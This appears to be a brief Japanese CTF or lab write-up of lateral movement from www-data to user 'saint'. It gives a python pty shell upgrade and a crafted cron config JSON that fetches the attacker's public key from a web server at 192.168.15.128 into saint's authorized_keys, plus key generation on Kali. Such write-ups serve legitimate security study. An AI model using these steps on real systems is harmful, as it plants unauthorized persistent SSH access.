TTYシェル

python -c 'import pty; pty.spawn("/bin/bash")'

saintの.sshディレクトリに書込み権限を持つcronに実行させたいファイルを準備する

vim 27-09-2020.config.json

{

"URL": "http://192.168.15.128:8000/id_rsa.pub","Output": "/home/saint/.ssh/authorized_keys"

}

![[横展開（www-data→saint） image.png]]

やられ側からダウンロード

![[横展開（www-data→saint） image 1.png]]

![[横展開（www-data→saint） image 2.png]]

このファイルを/tmpに置いておくと3分に1回攻撃者のWebサーバにsshの鍵を取りに来てくれる

kaliでsshの鍵ペアを生成する

ssh-keygen -t rsa -b 2048

![[横展開（www-data→saint） image 3.png]]

webサーバーを立てて待受け

![[横展開（www-data→saint） image 4.png]]

![[横展開（www-data→saint） image 5.png]]

成功